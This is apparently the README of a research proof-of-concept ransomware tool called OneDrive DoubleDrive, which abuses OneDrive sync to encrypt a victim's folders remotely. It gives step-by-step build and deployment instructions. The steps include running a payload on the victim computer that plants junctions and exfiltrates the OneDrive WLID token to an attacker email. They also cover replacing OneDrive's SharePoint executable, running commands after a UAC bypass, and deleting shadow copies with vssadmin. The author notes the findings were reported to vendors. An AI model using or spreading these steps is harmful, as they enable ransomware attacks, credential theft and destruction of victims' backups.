# OneDrive DoubleDrive
A DoubleDrive variant that uses OneDrive to encrypt local files remotely.

## How to use
1. Make sure you clone the DoubleDrive repo and install the DoubleDrive python package. If you are currently in the onedrive_doubledrive folder then run:
```cmd
pip install ../
```
2. Use `config_setup.py` to setup the exact configuration you want for the ransomware. For example:
```cmd
python .\config_setup.py --temp-email --target-paths C:\Users\Admin\Documents C:\Users\Admin\Desktop
```
3. While you are in the onedrive_doubledrive folder, run:
```cmd
pyinstaller --onefile --add-data "config.yaml;." .\endpoint_takeover.py; pyinstaller --onefile --add-data "config.yaml;." .\onedrive_doubledrive.py
```
In case you mentioned the `--onedrive-binaries-junction` flag in the previous stage then you should also run:
```cmd
pyinstaller --onefile --add-data "config.yaml;." .\follow_attacker_commands.py
```
4. A folder named `dist` will be created. Inside you can find `endpoint_takeover.exe` and `onedrive_doubledrive.exe`
5. Transfer `endpoint_takeover.exe` to the victim computer and run it. This will create junctions in the OneDrive sync folder that point towards the target folders the contain files to encrypt. It will also extract the WLID token of the OneDrive account and exfiltrate it by sharing it with the email address chosen in the configuration setup stage.
> Note - If you chose a temporary email address you should continue to the next step as soon as possible because the generated temporary email address that DoubleDrive uses works for a limited amount of time.
6. Execute `onedrive_doubledrive` with the preferred flags on the attacker's computer. For example:
```cmd
onedrive_doubledrive.exe --remote-ransomware
```
7. In case you passed the `--onedrive-binaries-junction` flag to the `config_setup.py` script in the configuration setup stage, then you can:
   1. Replace the SharePoint executable located in OneDrive's installation folder by running:
   ```cmd
   onedrive_doubledrive.exe --replace-sharepoint
   ```
   2. Execute commands using the `--run-command` flag. You can also run them after a UAC bypass was executed if you add the `--command-uac-bypass` flag. For example:
   ```cmd
   onedrive_doubledrive.exe --run-command "vssadmin delete shadows /all /quiet" --command-uac-bypass
   ```

## Update: SharePoint Executable Command Execution Technique
As you can read in the blog post I published about this research, the technique of replacing the SharePoint executable located in OneDrive's installation folder depends on the fact that `OneDrive.exe` runs `Microsoft.SharePoint.exe` when it starts. After I created this technique, and I reported my findings to all the relevant vendors, it now seems that in newer versions of OneDrive the `Microsoft.SharePoint.exe` executable is not run anymore every time `OneDrive.exe` starts. Seems like there are other triggers for `OneDrive.exe` to run `Microsoft.SharePoint.exe`, which I have not investigated. If you wish, you can alter DoubleDrive's code to write the `follow_attacker_commands.exe` executable to the current user's startup folder instead.